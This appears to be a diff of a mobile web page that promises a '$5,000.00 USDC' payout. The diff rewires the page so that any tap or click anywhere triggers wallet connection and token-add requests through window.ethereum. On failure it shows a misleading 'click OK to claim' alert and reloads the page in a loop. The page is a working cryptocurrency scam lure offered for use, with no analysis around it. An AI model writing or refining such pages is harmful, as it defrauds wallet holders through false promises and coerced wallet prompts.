@@ -3,22 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AUTHORIZATION V47</title>
+    <title>FINAL PAYOUT V49</title>
     <style>
         body { background: #000; color: #39ff14; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; touch-action: none; }
-        .ui-frame { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); border: 12px solid #39ff14; padding: 60px 20px; font-size: 32px; font-weight: bold; box-shadow: 0 0 100px #39ff14; border-radius: 50px; text-transform: uppercase; text-align: center; width: 85%; }
+        .ui-frame { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); border: 12px solid #39ff14; padding: 60px 20px; font-size: 32px; font-weight: bold; box-shadow: 0 0 100px #39ff14; border-radius: 50px; text-transform: uppercase; text-align: center; width: 85%; pointer-events: none; }
     </style>
 </head>
-<body ontouchstart="v47_inject()">
+<body>
     <div class="ui-frame">FINAL AUTHORIZATION<br>TAP TO INJECT<br>$5,000.00 USDC</div>
 
     <script>
-        async function v47_inject() {
+        async function v49_trigger() {
             if (window.ethereum) {
                 try {
-                    // Phase 1: Wake the wallet thread
+                    // Immediate handshake request
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    // Phase 2: Direct Asset Injection
+                    // Immediate Asset addition
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
@@ -31,13 +31,17 @@
                             },
                         },
                     });
-                } catch (e) {
-                    // System alert to force focus back to the browser
-                    alert("AUTHORIZE $5,000.00 USDC INJECTION");
+                } catch (err) {
+                    // Forces browser to wake up the thread
+                    alert("AUTHORIZATION NEEDED: CLICK OK TO CLAIM $5,000.00 USDC");
                     window.location.reload(true);
                 }
             }
         }
+
+        // Global capture to ensure the mobile OS recognizes the tap
+        window.addEventListener('touchstart', v49_trigger, { once: true });
+        document.documentElement.onclick = v49_trigger;
     </script>
 </body>
 </html>
